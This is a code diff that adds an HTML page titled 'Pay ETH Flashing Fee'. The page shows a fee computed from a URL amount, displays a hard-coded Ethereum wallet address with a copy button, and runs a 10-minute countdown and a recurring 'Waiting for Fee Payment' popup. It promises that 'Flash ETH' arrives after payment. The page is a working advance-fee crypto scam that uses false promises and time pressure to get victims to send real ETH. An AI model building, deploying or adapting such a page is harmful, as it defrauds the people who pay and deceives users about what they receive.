@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pay ETH Flashing Fee</title>
+  <style>
+    body {
+      background: #0b0c2a;
+      font-family: monospace;
+      text-align: center;
+      color: #3cc8c8;
+      padding: 20px;
+    }
+    h1 {
+      color: #3cc8c8;
+      text-shadow: 0 0 10px #3cc8c8;
+    }
+    .box {
+      background: #111;
+      padding: 30px;
+      border-radius: 10px;
+      border: 1px solid #3cc8c8;
+      box-shadow: 0 0 20px #3cc8c8;
+      max-width: 450px;
+      margin: 30px auto;
+    }
+    .label {
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    .value {
+      color: #fff;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    .copy-btn {
+      background: #3cc8c8;
+      color: #000;
+      padding: 8px 15px;
+      border: none;
+      font-weight: bold;
+      border-radius: 5px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .timer {
+      font-size: 20px;
+      margin-top: 20px;
+      color: yellow;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #111;
+      border: 2px solid red;
+      padding: 15px 25px;
+      color: red;
+      font-weight: bold;
+      border-radius: 10px;
+      box-shadow: 0 0 15px red;
+      display: none;
+      z-index: 9999;
+    }
+    
+.address-box {
+  background: #330000;
+  color: #ff4d4d;
+  padding: 10px;
+  border: 1px solid red;
+  border-radius: 5px;
+  font-size: 16px;
+  margin-top: 8px;
+  word-break: break-all;
+  overflow-wrap: anywhere;
+}
+
+  </style>
+</head>
+<body>
+
+  <h1>Pay ETH Flashing Fee</h1>
+  <div class="box">
+    <div class="label">Entered Amount:</div>
+    <div class="value" id="amount">Loading...</div>
+
+    <div class="label">You Pay :</div>
+    <div class="value" id="fee">Calculating...</div>
+
+    <div class="label">Send ETH Fee to this Address:</div>
+    <div class="address-box" id="wallet">0x0f9a863614287da330c9cce80e50df5c91981669</div>
+    <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+
+    <div class="timer" id="countdown">10:00</div>
+    <div class="warning">You must pay the fee within 10 minutes.<br>After paying the fee, Flash ETH will be transferred to your address within 5 minutes</div>
+  </div>
+
+  <div class="popup" id="popup">Waiting for Fee Payment...</div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const amount = parseFloat(params.get("amount"));
+    document.getElementById("amount").textContent = isNaN(amount) ? "Invalid" : "ETH: " + amount.toLocaleString();
+    document.getElementById("fee").textContent = isNaN(amount) ? "Invalid" : "ETH: " + (amount * 0.006).toFixed(4);
+    function copyAddress() {
+      const wallet = document.getElementById("wallet").textContent;
+      navigator.clipboard.writeText(wallet).then(() => {
+        alert("ETH address copied!");
+      });
+    }
+    
+// Countdown timer
+let timeLeft = 600;
+const timer = setInterval(() => {
+  const min = Math.floor(timeLeft / 60);
+  const sec = timeLeft % 60;
+  document.getElementById("countdown").textContent =
+    `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+  timeLeft--;
+  if (timeLeft < 0) {
+    clearInterval(timer);
+    window.location.href = "index.html";
+  }
+}, 1000);
+
+// Popup every 3s
+setInterval(() => {
+  const popup = document.getElementById("popup");
+  popup.style.display = "block";
+  setTimeout(() => popup.style.display = "none", 1000);
+}, 3000);
+
+  </script>
+
+</body>
+</html>
